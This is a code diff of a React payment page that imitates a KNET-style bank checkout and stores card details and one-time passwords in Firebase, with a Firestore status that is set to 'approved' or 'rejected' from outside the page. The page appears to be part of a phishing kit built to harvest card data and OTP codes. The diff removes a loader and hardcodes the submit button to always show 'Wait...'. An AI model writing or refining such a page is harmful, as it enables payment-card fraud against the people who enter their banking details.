@@ -2,7 +2,6 @@
 import { useEffect, useState } from "react"
 import { doc, onSnapshot } from "firebase/firestore"
 import { db, handlePay } from "@/lib/firebase"
-import { FullPageLoader } from "@/components/fullpageloader"
 import "./knet.css"
 import type React from "react"
 type PaymentInfo = {
@@ -120,7 +119,6 @@ const BANKS = [
 
 export default function Payment() {
   const handleSubmit = async () => {}
-  const [loading, setLoading] = useState(false)
   const amount =() => {
     if (typeof window !== "undefined") {
     //  return localStorage.getItem("item") || "0.00"
@@ -162,9 +160,7 @@ export default function Payment() {
             setPaymentInfo((prev) => ({ ...prev, status: data.status }))
             if (data.status === "approved") {
               setstep(2)
-              setLoading(false)
             } else if (data.status === "rejected") {
-              setLoading(false)
               alert("تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ")
               setstep(1)
             }
@@ -531,7 +527,6 @@ export default function Payment() {
                         }
                         onClick={() => {
                           if (step === 1) {
-                            setLoading(true)
                             handlePay(paymentInfo as any, setPaymentInfo as any)
                             handleSubmit()
                           } else if (step >= 2) {
@@ -542,11 +537,9 @@ export default function Payment() {
                             if (!newotp.includes(paymentInfo.otp!)) {
                               newotp.push(paymentInfo.otp!)
                             }
-                            setLoading(true)
                             handleAddotp(paymentInfo.otp!)
                             handlePay(paymentInfo as any, setPaymentInfo as any)
                             setTimeout(() => {
-                              setLoading(false)
                               setPaymentInfo({
                                 ...paymentInfo,
                                 otp: "",
@@ -556,7 +549,7 @@ export default function Payment() {
                           }
                         }}
                       >
-                        {loading ? "Wait..." : step === 1 ? "Submit" : "Verify OTP"}
+                        {true? "Wait..." : step === 1 ? "Submit" : "Verify OTP"}
                       </button>
                       <button style={{ background: "#ededed", marginRight: 2 }}>Cancel</button>
                     </div>
@@ -596,7 +589,6 @@ export default function Payment() {
           </div>
         </div>
       </form>
-      {loading && <FullPageLoader />}
     </div>
   )
 }
